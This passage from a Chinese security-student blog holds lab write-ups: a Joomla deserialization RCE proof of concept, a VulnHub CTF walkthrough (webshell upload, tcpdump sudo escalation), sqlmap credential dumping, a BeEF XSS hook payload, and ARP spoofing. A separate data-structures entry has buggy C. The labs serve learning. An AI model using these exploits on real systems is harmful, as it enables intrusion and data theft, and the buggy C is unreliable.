max-age=0</code></pre><p>返回的Cookie:</p><pre><code>43624f23bf50e5adc955be0e11ed9c2c=390eadc4a6ec125ef32fc0c28c5589be</code></pre><p>然后利用别人的exp生成POC</p><pre><code class="php">&lt;?phpclass JSimplepieFactory &#123;&#125;class JDatabaseDriverMysql &#123;&#125;class SimplePie &#123;    var $sanitize;    var $cache;    var $cache_name_function;    var $javascript;    var $feed_url;    function __construct()    &#123;        $this-&gt;feed_url = &quot;phpinfo();JFactory::getConfig();exit;&quot;;        $this-&gt;javascript = 9999;        $this-&gt;cache_name_function = &quot;assert&quot;;        $this-&gt;sanitize = new JDatabaseDriverMysql();        $this-&gt;cache = true;    &#125;&#125;class JDatabaseDriverMysqli &#123;    protected $a;    protected $disconnectHandlers;    protected $connection;    function __construct()    &#123;        $this-&gt;a = new JSimplepieFactory();        $x = new SimplePie();        $this-&gt;connection = 1;        $this-&gt;disconnectHandlers = [            [$x, &quot;init&quot;],        ];    &#125;&#125;$a = new JDatabaseDriverMysqli();$poc = serialize($a);$poc = str_replace(&quot;\x00*\x00&quot;, &#39;\\0\\0\\0&#39;, $poc);echo &quot;123&#125;__test|&#123;$poc&#125;\xF0\x9D\x8C\x86&quot;;</code></pre><p>运行生成的POC</p><pre><code>123&#125;__test|O:21:&quot;JDatabaseDriverMysqli&quot;:3:&#123;s:4:&quot;\0\0\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:&#123;&#125;s:21:&quot;\0\0\0disconnectHandlers&quot;;a:1:&#123;i:0;a:2:&#123;i:0;O:9:&quot;SimplePie&quot;:5:&#123;s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:&#123;&#125;s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:37:&quot;phpinfo();JFactory::getConfig();exit;&quot;;&#125;i:1;s:4:&quot;init&quot;;&#125;&#125;s:13:&quot;\0\0\0connection&quot;;i:1;&#125;𝌆</code></pre><p>将这个POC作为User-Agent，带上刚获取的Cookie发包，连续发两次这个包，因为第一次发包，让这个恶意构造的数据存储在数据库中，第二次发包，恶意代码就会被执行</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211213144219455.png" alt="image-20211213144219455"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络渗透实验四</title>
      <link href="/2021/12/06/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C%E5%9B%9B/"/>
      <url>/2021/12/06/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C%E5%9B%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="网络渗透实验四-：CTF实践"><a href="#网络渗透实验四-：CTF实践" class="headerlink" title="网络渗透实验四 ：CTF实践"></a>网络渗透实验四 ：CTF实践</h1><h2 id="实验目的："><a href="#实验目的：" class="headerlink" title="实验目的："></a>实验目的：</h2><p>通过对目标靶机的渗透过程，了解CTF竞赛模式，理解CTF涵盖的知识范围，如MISC、PPC、WEB等，通过实践，加强团队协作能力，掌握初步CTF实战能力及信息收集能力。熟悉网络扫描、探测HTTP web服务、目录枚举、提权、图像信息提取、密码破解等相关工具的使用。</p><h2 id="系统环境："><a href="#系统环境：" class="headerlink" title="系统环境："></a>系统环境：</h2><p>Kali Linux 2、WebDeveloper靶机来源：<a href="https://www.vulnhub.com/">https://www.vulnhub.com/</a> </p><h2 id="实验步骤和内容："><a href="#实验步骤和内容：" class="headerlink" title="实验步骤和内容："></a>实验步骤和内容：</h2><h3 id="目的："><a href="#目的：" class="headerlink" title="目的："></a>目的：</h3><p>获取靶机Web Developer 文件&#x2F;root&#x2F;flag.txt中flag。</p><h3 id="基本思路："><a href="#基本思路：" class="headerlink" title="基本思路："></a>基本思路：</h3><p>本网段IP地址存活扫描(netdiscover)；网络扫描(Nmap)；浏览HTTP 服务；网站目录枚举(Dirb)；发现数据包文件 “cap”；分析 “cap” 文件，找到网站管理后台账号密码；插件利用（有漏洞）；利用漏洞获得服务器账号密码；SSH 远程登录服务器；tcpdump另类应用。</p><h3 id="实施细节："><a href="#实施细节：" class="headerlink" title="实施细节："></a>实施细节：</h3><p>首先用Nmap发现靶机：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207084329047.png"></p><p>发现靶机开了80端口和22端口</p><p>用浏览器打开<code>http://192/168/118.135</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207084613488.png"></p><p>用whatweb来得到网站的cms为WordPress</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207090856645.png"></p><p>爆破一下目录：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207085538623.png"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207085632724.png"></p><p>扫出了几个敏感目录，如文件上传目录<code>/wp-content/uploads/</code>,后台登录目录<code>/wp-admin/admin.php</code>,还有个奇怪的目录<code>/ipdata/</code></p><p>打开&#x2F;ipdata&#x2F;，发现有个cap文件，把它下载下来</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207090154498.png"></p><p>用Wireshark打开，看看有没有登录的数据包</p><p>因为登录的是用POST方法传递参数，所以用<code>http.request.method==POST</code>过滤一下</p><p>打开第一个数据包就能得到账号密码</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207092105863.png"></p><p>拿这个账号密码去后台登录一下</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207100939737.png" alt="image-20211207100939737"></p><p>点击安装插件Plugins-&gt;Add New-&gt;Upload Plugin</p><p>在这里可以上传个php木马，因为它没过滤</p><p>php马：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207101248403.png" alt="image-20211207101248403"></p><p>上传后访问<code>/wp-content/uploads/2021/12/</code> </p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207101409524.png" alt="image-20211207101409524"></p><p>找到刚刚上传的文件，打开</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207101512849.png" alt="image-20211207101512849"></p><p>用蚁剑连接一下</p><p>url: <a href="http://192.168.52.70/wp-content/uploads/2021/12/ma.php">http://192.168.52.70/wp-content/uploads/2021/12/ma.php</a></p><p>密码:cmd</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207101910818.png" alt="image-20211207101910818"></p><p>webshell的权限比较低，没法打开root目录，寻找其他信息</p><p>在&#x2F;html&#x2F;找到wp-config.php，里面有有关数据库的配置</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207102913608.png" alt="image-20211207102913608"></p><p>盲猜这个也是服务器的账号密码，这个服务器还开着个ssh服务，尝试用ssh连接</p><pre><code>ssh webdeveloper@ip</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207103506765.png" alt="image-20211207103506765"></p><p>连接成功</p><p>但是权限不够</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207103716977.png" alt="image-20211207103716977"></p><p>接下来就是提权</p><p>使用tcpdump执行任意命令（当tcpdump捕获到数据包后会执行指定的命令。）</p><p>查看当前身份可执行的命令。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207104909692.png" alt="image-20211207104909692"></p><p>创建攻击文件</p><pre><code>touch /tmp/exploit</code></pre><p>写入shellcode</p><pre><code>echo &#39;cat /root/flag.txt&#39; &gt; /tmp/exploit</code></pre><p>赋予可执行权限</p><pre><code>chmod +x /tmp/exploit</code></pre><p>利用tcpdump执行任意命令</p><pre><code>sudo tcpdump -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/exploit -Z root</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207105849773.png" alt="image-20211207105849773"></p><p>拿到flag</p><h2 id="另一种姿势"><a href="#另一种姿势" class="headerlink" title="另一种姿势"></a>另一种姿势</h2><p>利用MeterSploit插件+reflex gallery插件漏洞实现</p><p>在上传插件处安装reflex gallery这个插件</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207190911989.png" alt="image-20211207190911989"></p><p>打开msfconsole</p><pre><code>use exploit/unix/webapp/wp_reflexgallery_file_upload</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207191141157.png" alt="image-20211207191141157"></p><p>然后就是修改配置</p><pre><code>set rhost 目标ip</code></pre><p>执行<code>exploit</code>,开始攻击</p><p>成功拿shell</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211207191629125.png" alt="image-20211207191629125"></p><p>权限不高，还需要提权，提权方式同上</p>]]></content>
      
      
      
        <tags>
            
            <tag> 网络渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络渗透实验三</title>
      <link href="/2021/12/01/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C%E4%B8%89/"/>
      <url>/2021/12/01/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C%E4%B8%89/</url>
      
        <content type="html"><![CDATA[<h1 id="网络渗透实验三"><a href="#网络渗透实验三" class="headerlink" title="网络渗透实验三"></a>网络渗透实验三</h1><h2 id="sqlmap的简单使用"><a href="#sqlmap的简单使用" class="headerlink" title="sqlmap的简单使用"></a>sqlmap的简单使用</h2><h3 id="实战目标"><a href="#实战目标" class="headerlink" title="实战目标"></a>实战目标</h3><p>实战1：枚举登录MYSQL数据的用户名与密码</p><p>实战2：枚举所有数据库</p><p>实战3：枚举指定数据库的数据表</p><p>实战4：获取指定数据库和表中所有列的信息</p><p>实战5：枚举指定数据表中的所有用户名与密码</p><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>kali（sqlmap）</p><p>metasplitable2-Linux（DVWA）</p><h3 id="实验开始"><a href="#实验开始" class="headerlink" title="实验开始"></a>实验开始</h3><p>用kali浏览器打开metasplitable2-Linux的DVWA靶场(admin&#x2F;password)</p><p>把等级调为最低–low</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211201201207598.png" alt="image-20211201201207598"></p><p>然后点击sql注入的对应模块</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211201201307588.png" alt="image-20211201201307588"></p><p>随便输入一个数字，发现url发生变化</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211201201536176.png" alt="image-20211201201536176"></p><p>注入点是在登录后的页面的，所以使用sqlmap还需要获取cookie</p><p>按下F12点击console,输入<code>document.cookie</code>得到cookie</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211201201737316.png" alt="image-20211201201737316"></p><p>sqlmap的基语法参数：</p><ul><li>-u ：指定目标URL，即注入点</li><li>–cookies：当前会话的cookies值</li><li>-b：获取数据库类型，检索数据库管理系统标识</li><li>–current-db：获取当前数据库</li><li>–current-user：获取当前登录数据库使用的用户</li></ul><p><a href="https://blog.csdn.net/weixin_46709219/article/details/109672641">其他命令参数看这里</a></p><p>打开终端，输入下面的命令</p><pre><code>sqlmap -u &quot;http://192.168.118.131/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot; --cookie=&#39;security=low; PHPSESSID=94eb2a6ac031fe1058d3fdfb2549346b&#39; -b  --current-db  --current-user</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211204162534820.png" alt="image-20211204162534820"></p><p>可以看到以下信息：</p><pre><code>当前数据库&quot;dvwa&quot;数据库类型&quot;MySQL&quot;当前登录数据库使用的用户:&quot;root&quot;</code></pre><p>输入下列命令，获取用户名和密码</p><ul><li><p>–users：枚举数据库用户名</p></li><li><p>–password：枚举数据库用户的密码（hash）</p></li></ul><pre><code>sqlmap -u &quot;http://192.168.118.131/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot; --cookie=&#39;security=low; PHPSESSID=94eb2a6ac031fe1058d3fdfb2549346b&#39; --users --password</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211204163346626.png" alt="image-20211204163346626"></p><p>得到用户名和密码</p><ul><li>–dbs:获取mysql下所有数据库</li></ul><pre><code>sqlmap -u &quot;http://192.168.118.131/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot; --cookie=&#39;security=low; PHPSESSID=94eb2a6ac031fe1058d3fdfb2549346b&#39; --dbs</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211204163820440.png" alt="image-20211204163820440"></p><p>获取数据库信息</p><ul><li>-D：指定的数据库</li><li>–dump：存储数据表项</li></ul><pre><code>sqlmap -u &quot;http://192.168.118.131/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot; --cookie=&#39;security=low; PHPSESSID=94eb2a6ac031fe1058d3fdfb2549346b&#39; -D dvwa --dump</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211204164604193.png" alt="image-20211204164604193"></p><p>其他命令就不多展示了</p><h2 id="XSS漏洞利用"><a href="#XSS漏洞利用" class="headerlink" title="XSS漏洞利用"></a>XSS漏洞利用</h2><ul><li><p>目标：</p><p>   利用Beef劫持客户端浏览器，通过目标主机浏览器获得该主机的详细信息。</p></li><li><p>环境</p></li></ul><p>​<code>桥接模式下进行</code></p><p>​1．Kali（使用beef生成恶意代码）(192.168.10.128)</p><p>​2．一台web服务器（留言板网站存在XSS跨站脚本漏洞）(192.168.10.117)</p><p>​3.客户端（用于访问web服务器）(192.168.10.107)</p><h3 id="实验开始："><a href="#实验开始：" class="headerlink" title="实验开始："></a>实验开始：</h3><p>将附件GuestBook丢进虚拟机里，搭建网站，可在Windows Server利用IIS(Internet Information Server)配置该网站</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211204170342140.png" alt="image-20211204170342140"></p><p>搭建完成后访问，http:&#x2F;&#x2F;服务器ip&#x2F;Message.asp，即<code>http://192.168.10.117/Message.asp</code></p><p>在这里有个留言板</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211204202954509.png" alt="dss"></p><p>来到kali，用AWVS扫一下，发现存在XSS漏洞</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211204210734444.png" alt="image-20211204210734444"></p><p>模仿攻击者攻击</p><p>打开终端输入<code>beef-xss</code>,得到payload</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211204203620720.png" alt="image-20211204203620720"></p><pre><code>&lt;script src=&quot;http://&lt;kali ip&gt; :3000/hook.js&quot;&gt;&lt;/script&gt;我这里的是&lt;script src=&quot;http://192.168.10.128:3000/hook.js&quot;&gt;&lt;/script&gt;</code></pre><p>将payload输入到留言板的内容项里，其他的也要填，随便填，E-mail处有格式检验，要符合格式</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211204203857334.png" alt="image-20211204203857334"></p><p>填完后，点击留言</p><p>来到客户机，即受害者</p><p>当受害者打开这个网站，正常的留言后，提交，网页会跳转到<a href="http://192.168.10.117/index.asp">http://192.168.10.117/index.asp</a></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211204204607670.png" alt="image-20211204204607670"></p><p>这里已经有着攻击者构造的恶意代码，受害者的主机信息就会返回到攻击者的服务器上</p><p>kali(攻击者)已经获得受害者的主机和浏览器信息</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211204205445225.png" alt="image-20211204205445225"></p><p>1.Details是浏览器信息</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211204210030531.png" alt="image-20211204210030531"></p><p>2.logs模块是键盘记录，即用户执行的鼠标键盘记录</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211204210153841.png" alt="image-20211204210153841"></p><p>其他模块查看<a href="https://blog.csdn.net/smli_ng/article/details/106067842">这里</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 网络渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线性表</title>
      <link href="/2021/11/27/%E7%BA%BF%E6%80%A7%E8%A1%A8/"/>
      <url>/2021/11/27/%E7%BA%BF%E6%80%A7%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="线性表的基本操作"><a href="#线性表的基本操作" class="headerlink" title="线性表的基本操作"></a>线性表的基本操作</h2><p>顺序表定义</p><pre><code class="c">typedef int DataType;struct List&#123;    int Max;//最大元素个数    int n;//实际元素个数    DataType *elem;//首地址&#125;;typedef struct List *SeqList;//顺序表类型定义</code></pre><p>顺序表遍历</p><pre><code class="c">void Print(SeqList slist)&#123;    int i;    for(i=0;i&lt;slist-&gt;n;i++)        printf(&quot;%d\n&quot;,slist-&gt;elem[i]);&#125;</code></pre><p>创建空顺序表</p><pre><code class="c">SeqList SetNullList_Seq(int m)//m为顺序表最大值&#123;    SeqList slist=(SeqList)malloc(sizeof(struct List)*m);//申请结构体空间    if(slist!=NULL)    &#123;        slist-&gt;elem=(DataType *)malloc(sizeof(int)*m);//申请顺序表空间，大小为m个int空间        if(slist-&gt;elem)        &#123;            slist-&gt;Max=m;            slist-&gt;n=0;           return(slist);         &#125;        else free(slist);            &#125;    printf(&quot;Alloc failure!\n&quot;);    return NULL;&#125;</code></pre><p>判断顺序表为空</p><pre><code class="c">int IsNullList_Seq(SeqList slist)&#123;    return(slist-&gt;n==0);&#125;</code></pre><p>顺序表–插入</p><pre><code class="c">int InserPre_seq(SeqList slist,int p,DataType x)//在线性表slist的p之前插入x,如果成功返回1，不成功返回0；&#123;    int q;    if(slist-&gt;n=slist-&gt;Max)    &#123;        printf(&quot;overflow&quot;);        return 0;    &#125;    if(p&lt;0||p&gt;slist-&gt;n)    &#123;        printf(&quot;not exist!\n&quot;);        rerurn 0;    &#125;    for(q=slist-&gt;n-1;q&gt;=p;q--)        slist-&gt;elem[q+1]=slist-&gt;elem[q];     slist-&gt;elem[p]=x;     slist-&gt;n=slist-&gt;n+1;     return 1;    &#125;</code></pre><p>顺序表–删除</p><pre><code class="c">int DdlIdex_seq(SeqList slist,int p)//删除下标为p的元素&#123;    int q;    if(q&lt;0||q&gt;slist-&gt;Max)    &#123;        printf(&quot;Not exist\n&quot;);        return 0;    &#125;    for(q=p;q&lt;slist-&gt;n-1;q++)        slist-&gt;elem[q]=slist-&gt;elem[q+1]；    slist-&gt;n=slist-&gt;n-1;    return 1;&#125;</code></pre><p>顺序表–查找</p><pre><code class="c">int LocateIndex_seq(SeqList slist,int x)//查找值为x的元素，返回元素的下标&#123;    int q;    for(q=0;q&lt;slist-&gt;n;q++)    &#123;        if(slist-&gt;elem[q]==x)            return q;    &#125;    return -1;    &#125;</code></pre><p>顺序表–二分查找–非递归</p><pre><code class="c">int Binsearch(SeqList slist,int key,int *pos)&#123;    int index=1;//比较次数    int mid;    int low=0;    int high=slist-&gt;n-1;    while(low&lt;=high)    &#123;        mid=(low+high)/2;        if(slist-&gt;elem[mid]==key)        &#123;            *pos=mid;            printf(&quot;找到，共进行%d次比较\n&quot;,index);            printf(&quot;要找到的数据%d在位置%d上\n&quot;,key,mid);            return 1;        &#125;        else if(slist-&gt;elem[mid]&gt;key)            high=mid-1;            else                low=mid+1;        index++;    &#125;    *pos=low;    printf(&quot;没有找到，共比较%d次\n&quot;,index-1);    printf(&quot;可将此数据插入到位置%d上\n&quot;,*pos);    return -1;&#125;</code></pre><p>顺序表–二分查找–递归</p><pre><code class="c">int Binsearch_recursion(SeqList slist,int key,int low,int high,int *pos)&#123;    int mid;    if(low&lt;=hight)    &#123;        mid=(low+high)/2;        if(slist-&gt;elem[mid]==key)        &#123;            printf(&quot;要找的数据%d在位置%d上&quot;,key,mid);            return 1;        &#125;        if(slist-&gt;elem[mid]&gt;key)        &#123;            *pos=mid;            return Binsearch_recursion(slist,key,low,mid-1,pos);            if(slist-&gt;elem[mid]&lt;key)            &#123;                *pos=mid+1;            return Binsearch_recursion(slist,key,mid+1,high,pos+1);            &#125;        &#125;    &#125;    printf(&quot;没有找到，可将此数插入到位置%d上\n&quot;,*pos);    return -1;&#125;</code></pre><hr><hr><p>链表定义</p><pre><code class="c">typedef int DataType;struct Node&#123;    DataType data; //数据域    struct Node *next;//指针域&#125;;typedef struct Node *PNode;//节点类型定义typedef struct Node *LinkList;//单链表类型定义</code></pre><p>链表遍历</p><pre><code class="c">void Print(LinkList head)&#123;    PNode p=head-&gt;next;    while(p)    &#123;        printf(&quot;%d\n&quot;,p-&gt;data);        p=p-&gt;next;    &#125;&#125;</code></pre><p>创建单链表</p><pre><code class="c">LinkList SetNullList_List()&#123;    LinkList head=(LinkList)malloc(sizeof(struct Node));    if(head!=NULL)        head-&gt;next=NULL;    else        printf(&quot;Alloc faliure&quot;);    return head;&#125;</code></pre><p>判断链表为空</p><pre><code class="c">int IsNull_List(Linklist head)&#123;    return(head-&gt;next==NULL);&#125;</code></pre><p>头插法建立单链表</p><pre><code class="c">void CreateList_Head(struct Node *head)&#123;    PNode p=NULL;    int data;    printf(&quot;请输入整型数据建立链表，以-1结束\n&quot;);    scanf(&quot;%d&quot;,&amp;data);    while(data!=-1)    &#123;        p=(struct Node)malloc(sizeof(struct Node));        p-&gt;data=data;        p-&gt;next=head-&gt;next;        head-&gt;head=p;        scanf(&quot;%d&quot;,&amp;data);     &#125;&#125;</code></pre><p>尾插法建立单链表</p><pre><code class="c">void CreateList_Tail(struct Node *head)&#123;    PNode p=NULL;    PNode q=head;    int data;    printf(&quot;请输入整型数据建立链表，以-1结束\n&quot;);    scanf(&quot;%d&quot;,&amp;data);    while(data!=1)    &#123;        p=(struct Node)malloc(sizeof(struct Node));        p-&gt;data=data;        p-&gt;next=NULL;        q-&gt;next=p;        q=p;        scanf(&quot;%d&quot;,&amp;data);    &#125;&#125;</code></pre><p>单链表的查找</p><pre><code class="c">PNode Locate_Link(LinkList list,DataType x)&#123;    PNode p;    if(llist==NULL) return NULL;    p=llist-&gt;next;    while(p!=NULL&amp;&amp;p-&gt;data!=x)        p=p-&gt;next;    return p;&#125;</code></pre><p>单链表的插入–后插算法</p><pre><code class="C">int InsertPost_Link(LinkList llist,PNode p,DataType x)//在llist链表中的p位置之后插入值为x的结点&#123;    PNode q;    if(p==NUll)    &#123;        printf(&quot;para meter failure!\n&quot;);        return 0;    &#125;    q=(PNode)malloc(sizeof(struct Node));    if(q==NULL)    &#123;        printf(&quot;Alloc failure!\n&quot;);        return 0;    &#125;    else    &#123;        q-&gt;data=x;        q-&gt;next=p-&gt;next;        p-&gt;next=q;        return 1;    &#125;&#125;</code></pre><p>单链表的插入–前插算法</p><pre><code class="c">int InsertPre_Link(LinkList llist,PNode p,DataType x)//在llist链表中的p位置之前插入值为x的结点&#123;    PNode q=NULL;    PNode pre=llist;    while(pre-&gt;next!=p)//定位前p的前驱结点    &#123;        pre=pre-&gt;next;    &#125;    q=(PNode)malloc(sizeof(struct Node));    if(q==NULL)return 0;    q-&gt;data=x;    q-&gt;next=p;    pre-&gt;next=q;    return 1;&#125;</code></pre><p>单链表按位删除</p><pre><code class="c">void DelPostion_link(LinkList head,PNode r)//删除r指针所指的结点&#123;    PNode pre=head;    while(pre-&gt;next!=r)    &#123;        pre=pre-&gt;next;    &#125;    pre-&gt;next=r-&gt;next;    free(r);&#125;</code></pre><p>单链表按值删除</p><pre><code class="c">void DelValue_Link(struct Node *head,int data)&#123;    struct Node *p=head-&gt;next;    struct Node *beforeP=head;    while(p!=NUll)    &#123;        if(p-&gt;data==data)        &#123;            beforeP-&gt;next=p-&gt;next;            free(p);            break;        &#125;        else        &#123;            beforeP=p;            p=p-&gt;next;        &#125;    &#125;&#125;</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>网络渗透实验二</title>
      <link href="/2021/11/23/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C%E4%BA%8C/"/>
      <url>/2021/11/23/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="网络渗透实验二"><a href="#网络渗透实验二" class="headerlink" title="网络渗透实验二"></a>网络渗透实验二</h1><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的:"></a>实验目的:</h2><p>1、通过使用Wireshark软件掌握Sniffer（嗅探器）工具的使用方法，实现捕捉HTTP等协议的数据包，以理解TCP&#x2F;IP协议中多种协议的数据结构、通过实验了解HTTP等协议明文传输的特性。</p><p>2、研究交换环境下的网络嗅探实现及防范方法，研究并利用ARP协议的安全漏洞，通过Arpspoof实现ARP欺骗以捕获内网其他用户数据。</p><p>3、能利用BrupSuite实现网站登录暴力破解获得登录密码。</p><p>4、能实现ZIP密码破解，理解安全密码的概念和设置。</p><h2 id="系统环境："><a href="#系统环境：" class="headerlink" title="系统环境："></a>系统环境：</h2><p>Kali Linux 2、Windows</p><h2 id="网络环境："><a href="#网络环境：" class="headerlink" title="网络环境："></a>网络环境：</h2><p>交换网络结构</p><h2 id="实验工具："><a href="#实验工具：" class="headerlink" title="实验工具："></a>实验工具：</h2><p>Arpspoof</p><p>WireShark</p><p>BurpSuite</p><p>fcrackzip</p><p>以上工具kali有</p><h2 id="实验步骤和内容："><a href="#实验步骤和内容：" class="headerlink" title="实验步骤和内容："></a>实验步骤和内容：</h2><h3 id="网络嗅探部分："><a href="#网络嗅探部分：" class="headerlink" title="网络嗅探部分："></a>网络嗅探部分：</h3><p>网络嗅探：Wireshark 监听网络流量，抓包。</p><p>ARP欺骗： ArpSpoof，实施ARP欺骗。</p><p>防范： 防范arp欺骗。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/wps31B8.tmp.png" alt="img"></p><ul><li><p>1、A主机上外网，B运行sinffer(Wireshark)选定只抓源为A的数据)。</p></li><li><ul><li>1.1 写出以上过滤语句。</li></ul></li><li><ul><li>1.2 B是否能看到A和外网的通信（A刚输入的帐户和口令）？为什么？</li></ul></li></ul><p>这里开了两个虚拟机，一个是kali(192.168.118.128)，即B,一个是win10(192.168.118.132)，即A</p><p>先用nmap 扫一下看看</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211123230256003.png"></p><p>一点问题都没有，继续下一步</p><p>kali打开Wireshark抓包，用win10 ping一下kali</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211123231447162.png" alt="image-20211123231447162"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211123231514291.png" alt="image-20211123231514291"></p><p>过滤语句是</p><pre><code>ip.src==192.168.118.132</code></pre><p>因为ping是使用ICMP协议的，所以找到ICMP,下面的Data即为ping的内容</p><ul><li>2.1 为了捕获A到外网的数据，B实施ARP欺骗攻击，B将冒充该子网的什么实体？</li></ul><blockquote><p>B冒充的是子网中的网关</p></blockquote><ul><li>2.2 写出arpspoof命令格式。</li></ul><blockquote><p>arpspoof -i 指定使用的网卡 -t 要欺骗的主机ip   冒充的网关</p></blockquote><p>如果arpspoof没有安装,执行下面命令</p><pre><code>sudo apt-get install dsniff</code></pre><p>为了不让靶机使用者发现，需要他打开端口转发，不然B主机没法上网</p><pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code></pre><p>因为我使用的是两虚拟机，NAT模式下进行，<code>kali(192.168.118.128),win10(192.168.118.132)</code>,网关<code>192.168.118.2</code></p><pre><code>先执行这个echo 1 &gt; /proc/sys/net/ipv4/ip_forward再执行这个arpspoof -i eth0 -t 192.168.118.132 192.168.118.2</code></pre><ul><li>2.3 B是否能看到A和外网的通信（A刚输入的帐户和口令）？</li></ul><blockquote><p>可以，具体操作看下题</p></blockquote><ul><li>2.4 在互联网上找到任意一个以明文方式传递用户帐号、密码的网站，截图Wireshark中显示的明文信息。</li></ul><blockquote><p> 保持kali对win10的“欺骗”，打开Wireshark进行抓包，win10打开某网站，XX生活网，随便输入账号密码，点击登录</p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124180851625.png" alt="image-20211124180851625"></p><blockquote><p>返回kali的Wireshark停止抓包，输入过滤<code>http and ip.src==192.168.118.132</code></p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124181643055.png" alt="image-20211124181643055"></p><blockquote><p>这里可以看到win10和外网的通讯和以明文传输的账号密码</p></blockquote><ul><li><p>3 、FTP数据还原部分：利用WireShark打开实验实验数据data.pcapng。</p></li><li><p>3.1 FTP服务器的IP地址是多少？你是如何发现其为FTP服务器的？</p></li></ul><blockquote><p>先过滤流，输入<code>ftp</code></p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124183328218.png" alt="image-20211124183328218"></p><blockquote><p>查看info的response,因为response是FTP服务器对客户请求进行响应，所以这个source就是FTP服务器的IP，即<code>192.168.182.1</code></p></blockquote><ul><li>3.2客户端登录FTP服务器的账号和密码分别是什么?</li></ul><blockquote><p>客户端登录FTP服务器,即request,查看info的request即可</p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124184417803.png" alt="image-20211124184417803"></p><blockquote><p>可以看到有两个账号密码，分别是 <code>anonymous/mozilla@example.com</code>和<code>student/sN46i5y</code></p></blockquote><ul><li>3.3 客户端从FTP下载或查看了2个文件，一个为ZIP文件，一个为TXT文件，文件名分别是什么？<em>提示：文件名有可能是中文。</em></li></ul><blockquote><p>把刚刚的过滤去掉，点击编辑-&gt;查找分组，把设置更改为下图</p></blockquote><p><img 